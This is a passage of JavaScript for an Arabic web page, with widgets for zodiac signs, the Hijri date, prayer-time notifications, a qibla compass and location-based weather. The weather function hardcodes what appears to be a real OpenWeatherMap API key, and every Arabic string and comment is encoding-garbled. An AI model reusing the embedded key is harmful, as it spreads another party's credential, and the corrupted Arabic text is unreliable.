            motto: "Ø£Ù†Ø§ Ø£ÙˆØ§Ø²Ù†ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£Ù†Ø³Ø¬Ù….",
            info: "ÙŠØªÙ…ÙŠØ² Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ù…ÙŠØ²Ø§Ù† Ø¨Ø§Ù„Ø¯Ø¨Ù„ÙˆÙ…Ø§Ø³ÙŠØ©ØŒ Ø§Ù„Ø¹Ø¯Ù„ØŒ ÙˆØ­Ø¨Ù‡Ù… Ù„Ù„Ø§Ù†Ø³Ø¬Ø§Ù…. Ù‡Ù… Ø§Ø¬ØªÙ…Ø§Ø¹ÙŠÙˆÙ†ØŒ Ø³Ø§Ø­Ø±ÙˆÙ†ØŒ ÙˆÙŠØ³Ø¹ÙˆÙ† Ø¯Ø§Ø¦Ù…Ø§Ù‹ Ù„ØªØ­Ù‚ÙŠÙ‚ Ø§Ù„ØªÙˆØ§Ø²Ù† ÙÙŠ Ø¹Ù„Ø§Ù‚Ø§ØªÙ‡Ù… ÙˆÙ…Ø­ÙŠØ·Ù‡Ù…." 
        };
    } else if ((month == 10 && day >= 23) || (month == 11 && day <= 21)) {
        return { 
            name: "â™ Ø§Ù„Ø¹Ù‚Ø±Ø¨", 
            motto: "Ø£Ù†Ø§ Ø£Ø±ØºØ¨ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£ØªØ­ÙˆÙ„.",
            info: "Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø¹Ù‚Ø±Ø¨ Ø´Ø¬Ø¹Ø§Ù†ØŒ Ø¹Ø§Ø·ÙÙŠÙˆÙ†ØŒ ÙˆÙŠÙ…ØªÙ„ÙƒÙˆÙ† Ù‚ÙˆØ© Ø¥Ø±Ø§Ø¯Ø© Ù‡Ø§Ø¦Ù„Ø©. Ù‡Ù… Ø£ØµØ¯Ù‚Ø§Ø¡ Ø£ÙˆÙÙŠØ§Ø¡ ÙˆÙ„ÙƒÙ†Ù‡Ù… Ø­Ø°Ø±ÙˆÙ†ØŒ ÙˆÙ„Ø¯ÙŠÙ‡Ù… Ù‚Ø¯Ø±Ø© Ø¹Ù…ÙŠÙ‚Ø© Ø¹Ù„Ù‰ ÙÙ‡Ù… Ø¨ÙˆØ§Ø·Ù† Ø§Ù„Ø£Ù…ÙˆØ±." 
        };
    } else if ((month == 11 && day >= 22) || (month == 12 && day <= 21)) {
        return { 
            name: "â™ Ø§Ù„Ù‚ÙˆØ³", 
            motto: "Ø£Ù†Ø§ Ø£Ø±Ù‰ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£Ø³ØªÙƒØ´Ù.",
            info: "ÙŠÙØ¹Ø±Ù Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ù‚ÙˆØ³ Ø¨Ø§Ù„ÙƒØ±Ù…ØŒ Ø§Ù„ØªÙØ§Ø¤Ù„ØŒ ÙˆØ­Ø¨Ù‡Ù… Ù„Ù„Ø­Ø±ÙŠØ© ÙˆØ§Ù„Ù…ØºØ§Ù…Ø±Ø©. ÙŠÙ…ØªÙ„ÙƒÙˆÙ† Ø­Ø³ Ø¯Ø¹Ø§Ø¨Ø© Ø±Ø§Ø¦Ø¹ ÙˆÙŠØ¹Ø´Ù‚ÙˆÙ† Ø§Ù„Ø³ÙØ± ÙˆØ§Ø³ØªÙƒØ´Ø§Ù Ø§Ù„ÙÙ„Ø³ÙØ§Øª ÙˆØ§Ù„Ø«Ù‚Ø§ÙØ§Øª Ø§Ù„Ù…Ø®ØªÙ„ÙØ©." 
        };
    } else if ((month == 12 && day >= 22) || (month == 1 && day <= 19)) {
        return { 
            name: "â™‘ Ø§Ù„Ø¬Ø¯ÙŠ", 
            motto: "Ø£Ù†Ø§ Ø£Ø³ØªØ®Ø¯Ù…ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£Ù†Ø¬Ø­.",
            info: "ÙŠØªÙ…ÙŠØ² Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø¬Ø¯ÙŠ Ø¨Ø§Ù„Ù…Ø³Ø¤ÙˆÙ„ÙŠØ©ØŒ Ø§Ù„Ø§Ù†Ø¶Ø¨Ø§Ø·ØŒ ÙˆØ§Ù„Ù‚Ø¯Ø±Ø© Ø¹Ù„Ù‰ Ø§Ù„ØªØ­ÙƒÙ… Ø¨Ø§Ù„Ù†ÙØ³. Ù‡Ù… Ø¬Ø§Ø¯ÙˆÙ† ÙˆØ·Ù…ÙˆØ­ÙˆÙ†ØŒ ÙˆÙŠØ¹Ù…Ù„ÙˆÙ† Ø¨Ø¬Ø¯ Ù„ØªØ­Ù‚ÙŠÙ‚ Ø£Ù‡Ø¯Ø§ÙÙ‡Ù… Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø¯Ù‰ Ø§Ù„Ø·ÙˆÙŠÙ„." 
        };
    } else if ((month == 1 && day >= 20) || (month == 2 && day <= 18)) {
        return { 
            name: "â™’ Ø§Ù„Ø¯Ù„Ùˆ", 
            motto: "Ø£Ù†Ø§ Ø£Ø¹Ø±ÙØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£ØºÙŠØ±.",
            info: "Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø¯Ù„Ùˆ Ù…Ø³ØªÙ‚Ù„ÙˆÙ†ØŒ Ù…Ø¨Ø¯Ø¹ÙˆÙ†ØŒ ÙˆØ¥Ù†Ø³Ø§Ù†ÙŠÙˆÙ†. ÙŠØ­Ø¨ÙˆÙ† Ù…Ø³Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¢Ø®Ø±ÙŠÙ† ÙˆÙŠÙ…ØªÙ„ÙƒÙˆÙ† ØªÙÙƒÙŠØ±Ø§Ù‹ ØªÙ‚Ø¯Ù…ÙŠØ§Ù‹ ÙˆÙ…Ø¨ØªÙƒØ±Ø§Ù‹ØŒ ÙˆÙŠØ³Ø¹ÙˆÙ† Ù„Ø¬Ø¹Ù„ Ø§Ù„Ø¹Ø§Ù„Ù… Ù…ÙƒØ§Ù†Ø§Ù‹ Ø£ÙØ¶Ù„." 
        };
    } else if ((month == 2 && day >= 19) || (month == 3 && day <= 20)) {
        return { 
            name: "â™“ Ø§Ù„Ø­ÙˆØª", 
            motto: "Ø£Ù†Ø§ Ø£Ø¤Ù…Ù†ØŒ Ø¥Ø°Ù† Ø£Ù†Ø§ Ø£Ø­Ù„Ù….",
            info: "ÙŠØªÙ…ÙŠØ² Ù…ÙˆØ§Ù„ÙŠØ¯ Ø§Ù„Ø­ÙˆØª Ø¨Ø§Ù„ØªØ¹Ø§Ø·ÙØŒ Ø§Ù„ÙÙ†ØŒ ÙˆØ§Ù„Ø­ÙƒÙ…Ø©. Ù‡Ù… Ø­Ø³Ø§Ø³ÙˆÙ†ØŒ Ø­Ø§Ù„Ù…ÙˆÙ†ØŒ ÙŠÙ…ØªÙ„ÙƒÙˆÙ† Ø­Ø¯Ø³Ø§Ù‹ Ù‚ÙˆÙŠØ§Ù‹ØŒ ÙˆÙ…ØªØµÙ„ÙˆÙ† Ø¨Ø¹Ù…Ù‚ Ø¨Ø¹Ø§Ù„Ù…Ù‡Ù… Ø§Ù„Ø¯Ø§Ø®Ù„ÙŠ ÙˆØ¹ÙˆØ§Ø·Ù Ø§Ù„Ø¢Ø®Ø±ÙŠÙ†." 
        };
    }
    return null;
}
// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

// Ø¯Ø§Ù„Ø© Ù„Ø¬Ù„Ø¨ ÙˆØ¹Ø±Ø¶ Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ù‡Ø¬Ø±ÙŠ
function displayHijriDate() {
    // Ù†Ø³ØªØ®Ø¯Ù… ÙƒØ§Ø¦Ù† Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ø¯ÙˆÙ„ÙŠ Ø§Ù„Ù…Ø¯Ù…Ø¬ ÙÙŠ Ø§Ù„Ù…ØªØµÙØ­ Ù„Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ù‡Ø¬Ø±ÙŠ
    // 'ar-SA' -> Ù„Ù„ØºØ© Ø§Ù„Ø¹Ø±Ø¨ÙŠØ© (Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©) Ù„Ø¶Ù…Ø§Ù† Ø£Ø³Ù…Ø§Ø¡ Ø§Ù„Ø´Ù‡ÙˆØ± Ø§Ù„Ø¹Ø±Ø¨ÙŠØ©
    // '-u-ca-islamic' -> Ù„ØªØ­Ø¯ÙŠØ¯ Ø£Ù†Ù†Ø§ Ù†Ø±ÙŠØ¯ Ø§Ù„ØªÙ‚ÙˆÙŠÙ… Ø§Ù„Ø¥Ø³Ù„Ø§Ù…ÙŠ
    const hijriDateFormatter = new Intl.DateTimeFormat('ar-SA-u-ca-islamic', {
        day: 'numeric',
        month: 'long',
        year: 'numeric'
    });

    // Ù†Ø­ØµÙ„ Ø¹Ù„Ù‰ Ø§Ù„ØªØ§Ø±ÙŠØ® Ø§Ù„Ø­Ø§Ù„ÙŠ ÙˆÙ†Ù‚ÙˆÙ… Ø¨ØªØ­ÙˆÙŠÙ„Ù‡
    const today = new Date();
    const hijriDate = hijriDateFormatter.format(today);

    // Ù†Ø¹Ø±Ø¶ Ø§Ù„ØªØ§Ø±ÙŠØ® ÙÙŠ Ø§Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ù…Ø®ØµØµ Ù„Ù‡ ÙÙŠ HTML
    const hijriContainer = document.getElementById('hijri-date-container');
    if (hijriContainer) {
        hijriContainer.innerHTML = `ğŸŒ™ ${hijriDate}`;
    }
}

// Ù†Ø³ØªØ¯Ø¹ÙŠ Ø§Ù„Ø¯Ø§Ù„Ø© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ù„ÙŠØ¹Ù…Ù„ Ø§Ù„ØªØ§Ø±ÙŠØ® Ø¨Ø´ÙƒÙ„ ØªÙ„Ù‚Ø§Ø¦ÙŠ
document.addEventListener('DOMContentLoaded', displayHijriDate);

// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®

// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

document.addEventListener('DOMContentLoaded', () => {
    // --- Ù…ØªØºÙŠØ±Ø§Øª Ø¹Ø§Ù…Ø© ---
    const citySelect = document.getElementById('city-select');
    const prayerCityTitle = document.getElementById('prayer-city-title');
    const adhanAudio = document.getElementById('adhan-audio');
    const notificationsBtn = document.getElementById('notifications-btn');
    const notificationsStatus = document.getElementById('notifications-status');
    let prayerTimesData = {}; // Ù„ØªØ®Ø²ÙŠÙ† Ù…ÙˆØ§Ù‚ÙŠØª Ø§Ù„ØµÙ„Ø§Ø©
    let notifiedPrayers = []; // Ù„ØªØªØ¨Ø¹ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„ØªÙŠ ØªÙ… Ø¥Ø±Ø³Ø§Ù„Ù‡Ø§

    // --- 1. Ø¬Ù„Ø¨ ÙˆØ¹Ø±Ø¶ Ù…ÙˆØ§Ù‚ÙŠØª Ø§Ù„ØµÙ„Ø§Ø© ---
    async function fetchPrayerTimes(city) {
        // Ø¹Ø±Ø¶ Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
        document.querySelectorAll('.prayer-item').forEach(item => item.classList.add('loading'));
        prayerCityTitle.textContent = `ğŸ•Œ Ù…ÙˆØ§Ù‚ÙŠØª Ø§Ù„ØµÙ„Ø§Ø© (${city})`;

        const country = 'Egypt';
        const method = 5; // Ø§Ù„Ù‡ÙŠØ¦Ø© Ø§Ù„Ù…ØµØ±ÙŠØ© Ø§Ù„Ø¹Ø§Ù…Ø© Ù„Ù„Ù…Ø³Ø§Ø­Ø©
        const apiUrl = `https://api.aladhan.com/v1/timingsByCity?city=${city}&country=${country}&method=${method}`;

        try {
            const response = await fetch(apiUrl);
            const data = await response.json();
            if (data.code === 200) {
                prayerTimesData = data.data.timings; // ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù…ÙˆØ§Ù‚ÙŠØª
                displayPrayerTimes(prayerTimesData);
            }
        } catch (error) {
            console.error('ÙØ´Ù„ Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆØ§Ù‚ÙŠØª:', error);
        }
    }

    function displayPrayerTimes(timings) {
        const formatTime = (time) => {
            const [hour, minute] = time.split(':');
            const h = parseInt(hour, 10);
            const suffix = h >= 12 ? 'Ù…' : 'Øµ';
            const formattedHour = ((h + 11) % 12 + 1);
            return `${formattedHour}:${minute} ${suffix}`;
        };

        document.getElementById('fajr-time').textContent = formatTime(timings.Fajr);
        document.getElementById('sunrise-time').textContent = formatTime(timings.Sunrise);
        document.getElementById('dhuhr-time').textContent = formatTime(timings.Dhuhr);
        document.getElementById('asr-time').textContent = formatTime(timings.Asr);
        document.getElementById('maghrib-time').textContent = formatTime(timings.Maghrib);
        document.getElementById('isha-time').textContent = formatTime(timings.Isha);
        document.querySelectorAll('.prayer-item').forEach(item => item.classList.remove('loading'));
    }

    // --- 2. ØªØ®ØµÙŠØµ Ø§Ù„Ù…ÙˆÙ‚Ø¹ ---
    citySelect.addEventListener('change', () => {
        fetchPrayerTimes(citySelect.value);
    });

    // --- 3. Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„Ø£Ø°Ø§Ù† ---
    notificationsBtn.addEventListener('click', () => {
        if (!('Notification' in window)) {
            notificationsStatus.textContent = 'Ø¹Ø°Ø±Ø§Ù‹ØŒ Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª.';
            return;
        }

        Notification.requestPermission().then(permission => {
            if (permission === 'granted') {
                notificationsStatus.textContent = 'ØªÙ… ØªÙØ¹ÙŠÙ„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø¨Ù†Ø¬Ø§Ø­. Ø³ÙŠØªÙ… ØªÙ†Ø¨ÙŠÙ‡Ùƒ Ø¹Ù†Ø¯ ÙƒÙ„ Ø£Ø°Ø§Ù†.';
                notificationsBtn.disabled = true;
                notificationsBtn.textContent = 'âœ… ØªÙ… Ø§Ù„ØªÙØ¹ÙŠÙ„';
                // Ø¨Ø¯Ø¡ Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø§Ù„ÙˆÙ‚Øª ÙƒÙ„ Ø¯Ù‚ÙŠÙ‚Ø©
                setInterval(checkPrayerTime, 60000);
            } else {
                notificationsStatus.textContent = 'ØªÙ… Ø±ÙØ¶ Ø§Ù„Ø¥Ø°Ù†. Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª.';
            }
        });
    });

    function checkPrayerTime() {
        const now = new Date();
        const currentTime = `${String(now.getHours()).padStart(2, '0')}:${String(now.getMinutes()).padStart(2, '0')}`;
        
        // Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„ØµÙ„ÙˆØ§Øª Ø§Ù„ØªÙŠ Ù†Ø±ÙŠØ¯ Ø¥Ø´Ø¹Ø§Ø±Ù‹Ø§ Ù„Ù‡Ø§
        const prayerCheckList = {
            'Fajr': 'Ø§Ù„ÙØ¬Ø±',
            'Dhuhr': 'Ø§Ù„Ø¸Ù‡Ø±',
            'Asr': 'Ø§Ù„Ø¹ØµØ±',
            'Maghrib': 'Ø§Ù„Ù…ØºØ±Ø¨',
            'Isha': 'Ø§Ù„Ø¹Ø´Ø§Ø¡'
        };

        for (const [prayerKey, prayerName] of Object.entries(prayerCheckList)) {
            // Ø¥Ø°Ø§ Ø­Ø§Ù† ÙˆÙ‚Øª Ø§Ù„ØµÙ„Ø§Ø© ÙˆÙ„Ù… ÙŠØªÙ… Ø¥Ø±Ø³Ø§Ù„ Ø¥Ø´Ø¹Ø§Ø± Ù„Ù‡Ø§ Ø§Ù„ÙŠÙˆÙ…
            if (prayerTimesData[prayerKey] === currentTime && !notifiedPrayers.includes(prayerKey)) {
                showNotification(prayerName);
                notifiedPrayers.push(prayerKey); // Ø¥Ø¶Ø§ÙØ© Ø§Ù„ØµÙ„Ø§Ø© Ø¥Ù„Ù‰ Ù‚Ø§Ø¦Ù…Ø© Ø§Ù„Ø¥Ø´Ø¹Ø§Ø±Ø§Øª Ø§Ù„Ù…Ø±Ø³Ù„Ø©
                break; // Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ØªØ­Ù‚Ù‚ Ø¨Ø¹Ø¯ Ø§Ù„Ø¹Ø«ÙˆØ± Ø¹Ù„Ù‰ Ø£ÙˆÙ„ ØµÙ„Ø§Ø©
            }
        }
        
        // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø¹Ø¯ Ù…Ù†ØªØµÙ Ø§Ù„Ù„ÙŠÙ„
        if (currentTime === "00:01") {
            notifiedPrayers = [];
        }
    }

    function showNotification(prayerName) {
        const notification = new Notification('Ø­Ø§Ù† Ø§Ù„Ø¢Ù† ÙˆÙ‚Øª Ø§Ù„Ø£Ø°Ø§Ù†', {
            body: `Ø­Ø§Ù† Ø§Ù„Ø¢Ù† Ù…ÙˆØ¹Ø¯ Ø£Ø°Ø§Ù† ØµÙ„Ø§Ø© ${prayerName} Ø­Ø³Ø¨ ØªÙˆÙ‚ÙŠØª ${citySelect.value}.`,
            icon: 'https://i.imgur.com/Cefk42h.png' // Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø¥Ø³Ù„Ø§Ù…ÙŠØ©
        });

        // ØªØ´ØºÙŠÙ„ ØµÙˆØª Ø§Ù„Ø£Ø°Ø§Ù†
        adhanAudio.play().catch(e => console.error("Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªØ´ØºÙŠÙ„ Ø§Ù„ØµÙˆØª:", e));
    }

    // --- Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£ÙˆÙ„ÙŠ ---
    fetchPrayerTimes(citySelect.value); // Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆØ§Ù‚ÙŠØª Ù„Ù„Ù…Ø¯ÙŠÙ†Ø© Ø§Ù„Ø§ÙØªØ±Ø§Ø¶ÙŠØ© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
});

// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®

// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

// Ù†Ø³ØªØ¯Ø¹ÙŠ Ø§Ù„Ø¯Ø§Ù„Ø© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
document.addEventListener('DOMContentLoaded', () => {
    const statusElement = document.getElementById('qibla-status');
    const arrowElement = document.getElementById('compass-arrow');

    if (!navigator.geolocation) {
        statusElement.textContent = 'Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø®Ø¯Ù…Ø© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹.';
        return;
    }

    // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ù„Ù„Ù…Ø³ØªØ®Ø¯Ù…
    navigator.geolocation.getCurrentPosition(locationSuccess, locationError);

    function locationSuccess(position) {
        const { latitude, longitude } = position.coords;
        statusElement.textContent = 'ØªÙ… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ØŒ ÙŠØ±Ø¬Ù‰ ØªÙˆØ¬ÙŠÙ‡ Ø§Ù„Ø¬Ù‡Ø§Ø².';

        // Ø¥Ø­Ø¯Ø§Ø«ÙŠØ§Øª Ø§Ù„ÙƒØ¹Ø¨Ø© Ø§Ù„Ù…Ø´Ø±ÙØ©
        const kaabaLat = 21.4225;
        const kaabaLng = 39.8262;

        // Ø­Ø³Ø§Ø¨ Ø²Ø§ÙˆÙŠØ© Ø§Ù„Ù‚Ø¨Ù„Ø©
        const qiblaAngle = calculateQiblaAngle(latitude, longitude, kaabaLat, kaabaLng);

        // Ø§Ù„Ø¨Ø¯Ø¡ ÙÙŠ Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹ Ù„Ø­Ø³Ø§Ø³Ø§Øª Ø§Ù„Ø¬Ù‡Ø§Ø² (Ø§Ù„Ø¨ÙˆØµÙ„Ø©)
        // Ù…Ù„Ø§Ø­Ø¸Ø©: ØªØ­ØªØ§Ø¬ Ø¥Ù„Ù‰ ØªÙØ¹ÙŠÙ„ Ù‡Ø°Ù‡ Ø§Ù„Ù…ÙŠØ²Ø© Ø¹Ù„Ù‰ Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª Ù…Ø«Ù„ Ø³ÙØ§Ø±ÙŠ
        if (window.DeviceOrientationEvent) {
            window.addEventListener('deviceorientation', (event) => {
                // event.alpha Ù‡Ùˆ Ø§ØªØ¬Ø§Ù‡ Ø§Ù„Ø¬Ù‡Ø§Ø² Ø¨Ø§Ù„Ù†Ø³Ø¨Ø© Ù„Ù„Ø´Ù…Ø§Ù„ (0-360)
                // webkitCompassHeading Ù‡Ùˆ Ø¨Ø¯ÙŠÙ„ Ù„Ø¨Ø¹Ø¶ Ø§Ù„Ù…ØªØµÙØ­Ø§Øª
                const heading = event.webkitCompassHeading || event.alpha;
                if (heading !== null) {
                    // ØªØ­Ø¯ÙŠØ« Ø§ØªØ¬Ø§Ù‡ Ø§Ù„Ø³Ù‡Ù…
                    // Ù†Ø·Ø±Ø­ Ø§ØªØ¬Ø§Ù‡ Ø§Ù„Ø¬Ù‡Ø§Ø² Ù…Ù† Ø²Ø§ÙˆÙŠØ© Ø§Ù„Ù‚Ø¨Ù„Ø© Ù„Ù†Ø­ØµÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ø§ØªØ¬Ø§Ù‡ Ø§Ù„ØµØ­ÙŠØ­
                    arrowElement.style.transform = `rotate(${qiblaAngle - heading}deg)`;
                } else {
                     statusElement.textContent = 'Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø¨ÙˆØµÙ„Ø© Ø§Ù„Ø¬Ù‡Ø§Ø².';
                }
            });
        } else {
            statusElement.textContent = 'Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø®Ø¯Ù…Ø© Ø§Ù„Ø¨ÙˆØµÙ„Ø©.';
        }
    }

    function locationError() {
        statusElement.textContent = 'ØªÙ… Ø±ÙØ¶ Ø§Ù„ÙˆØµÙˆÙ„ Ø¥Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹. Ù„Ø§ ÙŠÙ…ÙƒÙ† ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù‚Ø¨Ù„Ø©.';
    }

    // Ø¯Ø§Ù„Ø© Ø±ÙŠØ§Ø¶ÙŠØ© Ù„Ø­Ø³Ø§Ø¨ Ø²Ø§ÙˆÙŠØ© Ø§Ù„Ù‚Ø¨Ù„Ø©
    function calculateQiblaAngle(lat1, lon1, lat2, lon2) {
        const toRadians = (deg) => deg * Math.PI / 180;
        const latRad1 = toRadians(lat1);
        const lonRad1 = toRadians(lon1);
        const latRad2 = toRadians(lat2);
        const lonRad2 = toRadians(lon2);

        const y = Math.sin(lonRad2 - lonRad1);
        const x = Math.cos(latRad1) * Math.tan(latRad2) - Math.sin(latRad1) * Math.cos(lonRad2 - lonRad1);
        
        let angle = Math.atan2(y, x) * 180 / Math.PI;
        angle = (angle + 360) % 360; // ØªØ­ÙˆÙŠÙ„ Ø§Ù„Ø²Ø§ÙˆÙŠØ© Ø¥Ù„Ù‰ Ù†Ø·Ø§Ù‚ 0-360
        return angle;
    }
});

// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®
// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

// =============== ÙƒÙˆØ¯ Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù‚Ø³ (Ù…Ø¹ ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„ØªÙ„Ù‚Ø§Ø¦ÙŠ) ===============

// Ø¯Ø§Ù„Ø© Ù„Ø¬Ù„Ø¨ ÙˆØ¹Ø±Ø¶ Ø­Ø§Ù„Ø© Ø§Ù„Ø·Ù‚Ø³ Ø¨Ù†Ø§Ø¡Ù‹ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
async function fetchWeatherByLocation() {
    const apiKey = "109091969fcb8ac4b87631fc1218f15c"; // Ù…ÙØªØ§Ø­ API Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ

    // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† Ø¯Ø¹Ù… Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø®Ø¯Ù…Ø© ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    if (!navigator.geolocation) {
        document.getElementById('weather-location').textContent = 'Ø§Ù„Ù…ØªØµÙØ­ Ù„Ø§ ÙŠØ¯Ø¹Ù… ØªØ­Ø¯ÙŠØ¯ Ø§Ù„Ù…ÙˆÙ‚Ø¹';
        return;
    }

    // Ø·Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹ Ø§Ù„Ø¬ØºØ±Ø§ÙÙŠ Ù…Ù† Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…
    navigator.geolocation.getCurrentPosition(async (position) => {
        const { latitude, longitude } = position.coords;
        const apiUrl = `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&appid=${apiKey}&units=metric&lang=ar`;

        try {
            const response = await fetch(apiUrl);
            const data = await response.json();

            if (response.ok) {
                displayWeather(data);
            } else {
                console.error('Ø®Ø·Ø£ ÙÙŠ Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø·Ù‚Ø³:', data.message);
                document.getElementById('weather-location').textContent = 'Ù„Ø§ ÙŠÙ…ÙƒÙ† Ø¬Ù„Ø¨ Ø§Ù„Ø·Ù‚Ø³ Ù„Ù‡Ø°Ø§ Ø§Ù„Ù…ÙˆÙ‚Ø¹';
            }
        } catch (error) {
            console.error('ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø®Ø§Ø¯Ù… Ø§Ù„Ø·Ù‚Ø³:', error);
        }
    }, () => {
        // ÙÙŠ Ø­Ø§Ù„Ø© Ø±ÙØ¶ Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù… Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ù…ÙˆÙ‚Ø¹
        document.getElementById('weather-location').textContent = 'ØªÙ… Ø±ÙØ¶ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙˆÙ‚Ø¹';
        document.getElementById('weather-temp').textContent = 'ğŸ¤·â€â™‚ï¸';
        document.getElementById('weather-desc').textContent = 'ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙˆÙ‚Ø¹ Ù„Ø¹Ø±Ø¶ Ø§Ù„Ø·Ù‚Ø³.';
    });
}

// Ø¯Ø§Ù„Ø© Ù„Ø¹Ø±Ø¶ Ø¨ÙŠØ§Ù†Ø§Øª Ø§Ù„Ø·Ù‚Ø³ ÙÙŠ Ø§Ù„ØµÙØ­Ø© (ØªØ¨Ù‚Ù‰ ÙƒÙ…Ø§ Ù‡ÙŠ)
function displayWeather(data) {
    const locationElement = document.getElementById('weather-location');
    const tempElement = document.getElementById('weather-temp');
    const descElement = document.getElementById('weather-desc');

    if (locationElement && tempElement && descElement) {
        locationElement.textContent = data.name;
        tempElement.textContent = `${Math.round(data.main.temp)}Â°C`;
        descElement.textContent = data.weather[0].description;
    }
}

// --- Ø§Ù„ØªØ´ØºÙŠÙ„ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© ---
document.addEventListener('DOMContentLoaded', () => {
    // Ø§Ø³ØªØ¯Ø¹Ø§Ø¡ Ø¯Ø§Ù„Ø© Ø§Ù„Ø·Ù‚Ø³ Ø§Ù„Ø¬Ø¯ÙŠØ¯Ø© Ø§Ù„ØªÙŠ ØªØ¹ØªÙ…Ø¯ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    fetchWeatherByLocation();

